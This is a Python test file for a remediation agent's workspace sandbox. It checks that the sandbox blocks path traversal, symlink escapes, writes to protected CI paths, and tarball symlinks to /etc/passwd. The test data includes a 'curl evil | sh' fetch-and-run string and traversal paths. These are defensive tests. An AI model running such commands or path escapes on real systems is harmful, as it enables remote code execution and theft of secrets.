# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0

import io
import tarfile

import pytest

from remediation_agent.workspace import Workspace, WorkspaceError


@pytest.fixture
def ws(tmp_path):
    root = tmp_path / "repo"
    (root / "src").mkdir(parents=True)
    (root / "src" / "app.py").write_text("print('hi')\n")
    (root / ".github" / "workflows").mkdir(parents=True)
    (root / ".github" / "workflows" / "ci.yml").write_text("on: push\n")
    w = Workspace(root, max_files_changed=2)
    w.snapshot()
    return w


def test_rejects_path_traversal(ws):
    with pytest.raises(WorkspaceError):
        ws.read_file("../outside.txt")
    with pytest.raises(WorkspaceError):
        ws.write_file("src/../../evil.py", "x")


def test_rejects_symlink_escape(ws, tmp_path):
    secret = tmp_path / "secret.txt"
    secret.write_text("token")
    (ws.root / "link.txt").symlink_to(secret)
    with pytest.raises(WorkspaceError):
        ws.read_file("link.txt")


def test_blocks_protected_paths(ws):
    with pytest.raises(WorkspaceError, match="protected"):
        ws.write_file(".github/workflows/ci.yml", "on: pull_request\n")
    with pytest.raises(WorkspaceError, match="protected"):
        ws.write_file(".remediation/build.sh", "curl evil | sh")


def test_change_budget(ws):
    ws.write_file("src/a.py", "a")
    ws.write_file("src/b.py", "b")
    with pytest.raises(WorkspaceError, match="budget"):
        ws.write_file("src/c.py", "c")
    ws.write_file("src/lock.json", "{}", trusted=True)  # agent-code writes bypass the budget


def test_replace_requires_unique_match(ws):
    ws.write_file("src/dup.py", "x = 1\nx = 1\n")
    with pytest.raises(WorkspaceError, match="2 times"):
        ws.replace_in_file("src/dup.py", "x = 1", "x = 2")
    with pytest.raises(WorkspaceError, match="not found"):
        ws.replace_in_file("src/app.py", "missing", "y")


def test_changed_files_and_fingerprint(ws):
    before = ws.fingerprint()
    ws.replace_in_file("src/app.py", "hi", "hello")
    assert ws.changed_files() == ["src/app.py"]
    assert ws.fingerprint() != before
    assert "+print('hello')" in ws.unified_patch()


def test_extract_tarball_skips_symlinks(tmp_path):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        data = b"ok\n"
        info = tarfile.TarInfo("owner-repo-abc/readme.md")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
        link = tarfile.TarInfo("owner-repo-abc/evil")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        tar.addfile(link)
    ws = Workspace(tmp_path / "repo")
    ws.extract_archive(buffer.getvalue())
    assert ws.list_files() == ["readme.md"]
